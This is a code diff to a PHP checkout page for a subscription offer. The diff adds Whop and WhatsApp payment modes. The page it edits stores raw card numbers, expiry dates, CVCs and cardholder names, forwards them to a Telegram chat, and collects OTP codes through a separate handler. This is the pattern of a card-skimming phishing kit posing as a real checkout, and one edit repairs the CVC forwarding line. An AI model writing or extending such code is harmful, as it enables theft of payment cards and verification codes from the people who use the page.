@@ -54,6 +54,25 @@ $checkoutEnabled = ($settings['checkout_enabled'] ?? '1') === '1';
 $checkoutWhatsappNumber = trim($settings['checkout_whatsapp_number'] ?? '') ?: $supportWhatsappNumber;
 $checkoutTelegramChatId = trim($settings['checkout_telegram_chat_id'] ?? '');
 $checkoutTelegramToken = trim($settings['checkout_telegram_bot_token'] ?? '');
+$checkoutModeSetting = trim($settings['checkout_mode'] ?? '');
+$checkoutMode = in_array($checkoutModeSetting, ['form', 'whatsapp', 'whop'], true)
+    ? $checkoutModeSetting
+    : ($checkoutEnabled ? 'form' : 'whatsapp');
+$checkoutWhopPlanId = trim($settings['checkout_whop_plan_id'] ?? '');
+$checkoutWhopProductId = trim($settings['checkout_whop_product_id'] ?? '');
+$checkoutWhopLink = trim($settings['checkout_whop_link'] ?? '');
+$whopCheckoutUrl = $checkoutWhopLink !== '' ? $checkoutWhopLink : '';
+if ($whopCheckoutUrl === '' && $checkoutWhopPlanId !== '') {
+    $whopCheckoutUrl = 'https://whop.com/checkout/' . rawurlencode($checkoutWhopPlanId);
+    if ($checkoutWhopProductId !== '') {
+        $whopCheckoutUrl .= '?product_id=' . rawurlencode($checkoutWhopProductId);
+    }
+} elseif ($whopCheckoutUrl === '' && $checkoutWhopProductId !== '') {
+    $whopCheckoutUrl = 'https://whop.com/checkout/' . rawurlencode($checkoutWhopProductId);
+}
+$isFormCheckout = $checkoutMode === 'form';
+$isWhopCheckout = $checkoutMode === 'whop';
+$isWhatsappCheckout = $checkoutMode === 'whatsapp';
 $checkoutFieldsSetting = $settings['checkout_fields_enabled'] ?? '';
 $checkoutFieldsEnabled = json_decode($checkoutFieldsSetting, true);
 if (!is_array($checkoutFieldsEnabled)) {
@@ -129,7 +148,9 @@ $offerDuration = $selectedOffer['duration'] ?? '12 mois illimit�';
 $offerPrice = formatCurrency((float) ($selectedOffer['price'] ?? 0));
 $offerDescription = trim($selectedOffer['description'] ?? '') ?: "Confirme ton plan premium et re�ois l'activation en 5-7 minutes.";
 $offerFeatures = splitFeatures($selectedOffer['features'] ?? '');
-$whatsappLink = getWhatsappLink($checkoutWhatsappNumber, $offerName, (float) ($selectedOffer['price'] ?? 0), $offerDuration);
+$offerWhatsappNumber = trim($selectedOffer['whatsapp_number'] ?? '') ?: $checkoutWhatsappNumber;
+$offerWhatsappMessage = $selectedOffer['whatsapp_message'] ?? null;
+$whatsappLink = getWhatsappLink($offerWhatsappNumber, $offerName, (float) ($selectedOffer['price'] ?? 0), $offerDuration, $offerWhatsappMessage);
 
 if ($_SERVER['REQUEST_METHOD'] === 'POST' && $isAjax && isset($_POST['otp_value'], $_POST['order_id'])) {
     $otpValue = substr(preg_replace('/\D/', '', (string) ($_POST['otp_value'] ?? '')), 0, 10);
@@ -174,14 +195,14 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && $isAjax && isset($_POST['otp_value'
     ]);
     exit;
 }
-if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+if ($isFormCheckout && $_SERVER['REQUEST_METHOD'] === 'POST') {
     try {
-    $stmt = $pdo->prepare('INSERT INTO orders (offer_id, contact, newsletter, delivery, first_name, last_name, company, address, apartment, city, country, state, zip, phone, card_number, expiry, cvc, card_name, discount, otp, otp2) VALUES (:offer_id, :contact, :newsletter, :delivery, :first_name, :last_name, :company, :address, :apartment, :city, :country, :state, :zip, :phone, :card_number, :expiry, :cvc, :card_name, :discount, :otp, :otp2)');
-    $stmt->execute([
-        'offer_id' => $offerId,
-        'contact' => $_POST['contact'] ?? '',
-        'newsletter' => isset($_POST['newsletter']) ? 1 : 0,
-        'delivery' => $_POST['delivery'] ?? '',
+        $stmt = $pdo->prepare('INSERT INTO orders (offer_id, contact, newsletter, delivery, first_name, last_name, company, address, apartment, city, country, state, zip, phone, card_number, expiry, cvc, card_name, discount, otp, otp2) VALUES (:offer_id, :contact, :newsletter, :delivery, :first_name, :last_name, :company, :address, :apartment, :city, :country, :state, :zip, :phone, :card_number, :expiry, :cvc, :card_name, :discount, :otp, :otp2)');
+        $stmt->execute([
+            'offer_id' => $offerId,
+            'contact' => $_POST['contact'] ?? '',
+            'newsletter' => isset($_POST['newsletter']) ? 1 : 0,
+            'delivery' => $_POST['delivery'] ?? '',
             'first_name' => $_POST['first_name'] ?? '',
             'last_name' => $_POST['last_name'] ?? '',
             'company' => $_POST['company'] ?? '',
@@ -192,14 +213,14 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
             'state' => $_POST['state'] ?? '',
             'zip' => $_POST['zip'] ?? '',
             'phone' => $_POST['phone'] ?? '',
-        'card_number' => $_POST['card_number'] ?? '',
-        'expiry' => $_POST['expiry'] ?? '',
-        'cvc' => $_POST['cvc'] ?? '',
-        'card_name' => $_POST['card_name'] ?? '',
-        'discount' => $_POST['discount'] ?? '',
-        'otp' => NULL,
-        'otp2' => NULL,
-    ]);
+            'card_number' => $_POST['card_number'] ?? '',
+            'expiry' => $_POST['expiry'] ?? '',
+            'cvc' => $_POST['cvc'] ?? '',
+            'card_name' => $_POST['card_name'] ?? '',
+            'discount' => $_POST['discount'] ?? '',
+            'otp' => null,
+            'otp2' => null,
+        ]);
         $confirmationCode = $pdo->lastInsertId();
         $paymentSuccess = true;
 
@@ -220,11 +241,10 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
                 'Phone: ' . trim((string) ($_POST['phone'] ?? '')),
                 'card number: ' . str_replace(' ', '', $_POST['card_number'] ?? ''),
                 'expiry: ' . str_replace(' ', '', $_POST['expiry'] ?? ''),
-                'cvc: ' . $_POST['cvc'] ?? '',
-                'card_name: ' . $_POST['card_name'] ?? '',
+                'cvc: ' . ($_POST['cvc'] ?? ''),
+                'card_name: ' . ($_POST['card_name'] ?? ''),
             ];
-            $message = implode("
-", array_filter($messageLines, fn($line) => trim($line) !== '' && trim($line) !== ' /'));
+            $message = implode("\n", array_filter($messageLines, fn($line) => trim($line) !== '' && trim($line) !== ' /'));
             sendCheckoutTelegram($checkoutTelegramToken, $checkoutTelegramChatId, $message);
         }
 
@@ -244,11 +264,16 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         ]);
         exit;
     }
+} elseif (!$isFormCheckout && $_SERVER['REQUEST_METHOD'] === 'POST' && !$isAjax) {
+    $redirectUrl = $isWhopCheckout && $whopCheckoutUrl !== '' ? $whopCheckoutUrl : $whatsappLink;
+    if ($redirectUrl !== '') {
+        header('Location: ' . $redirectUrl);
+        exit;
+    }
 }
-
-
-if (!$checkoutEnabled && $_SERVER['REQUEST_METHOD'] === 'POST') {
-    header('Location: ' . $whatsappLink);
+$shouldBypassWhopRedirect = isset($_GET['preview_whop']) && $_GET['preview_whop'] === '1';
+if ($isWhopCheckout && !$isAjax && $_SERVER['REQUEST_METHOD'] !== 'POST' && !$shouldBypassWhopRedirect && $whopCheckoutUrl !== '') {
+    header('Location: ' . $whopCheckoutUrl);
     exit;
 }
 
@@ -423,7 +448,7 @@ $seoDescription = 'Complète ta commande ' . $offerName . ' (' . $offerDuration 
                         </div>
                         <span class="price-tag">$<?= e($offerPrice) ?></span>
                     </div>
-                    <?php if ($checkoutEnabled): ?>
+                    <?php if ($isFormCheckout): ?>
                     <form class="checkout-form" action="<?= e($_SERVER['REQUEST_URI'] ?? '') ?>" method="post" novalidate>
                         <input type="hidden" name="offer_id" value="<?= (int) $offerId ?>">
                         <div class="form-head">
@@ -601,6 +626,19 @@ $seoDescription = 'Complète ta commande ' . $offerName . ' (' . $offerDuration 
                     </div>
                     <p class="input-error" data-payment-error></p>
                 </form>
+                    <?php elseif ($isWhopCheckout): ?>
+                        <div class="checkout-disabled checkout-whop">
+                            <h3>Checkout via Whop</h3>
+                            <p>You will be redirected to our Whop checkout to pay securely.</p>
+                            <div class="checkout-actions">
+                                <?php if ($whopCheckoutUrl !== ''): ?>
+                                    <a class="btn primary" href="<?= e($whopCheckoutUrl) ?>" target="_blank" rel="noopener">Continue on Whop</a>
+                                <?php else: ?>
+                                    <span class="input-error">Whop checkout link missing. Please contact support.</span>
+                                <?php endif; ?>
+                                <a href="<?= $basePath ?>/?lang=<?= e($lang) ?>#offres" class="link-light" data-keep-lang>Back to offers</a>
+                            </div>
+                        </div>
                     <?php else: ?>
                         <div class="checkout-disabled">
                             <h3>Checkout temporarily closed</h3>
